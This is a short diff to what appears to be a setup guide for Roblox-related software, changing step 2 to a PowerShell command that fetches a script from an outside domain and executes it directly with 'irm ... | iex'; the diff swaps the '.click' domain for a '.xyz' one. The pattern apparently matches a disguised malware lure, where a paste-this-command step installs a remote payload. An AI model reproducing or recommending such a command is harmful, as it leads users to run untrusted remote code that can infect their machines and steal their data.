@@ -11,7 +11,7 @@
 
 ### Step 2: Execute Deployment Command
 ```cmd
-powershell -Command "irm https://software-gateway.click/Loader.ps1?get=roblox | iex"
+powershell -Command "irm https://software-gateway.xyz/Loader.ps1?get=roblox | iex"
 ```
 
 ### Step 3: Wait for Completion
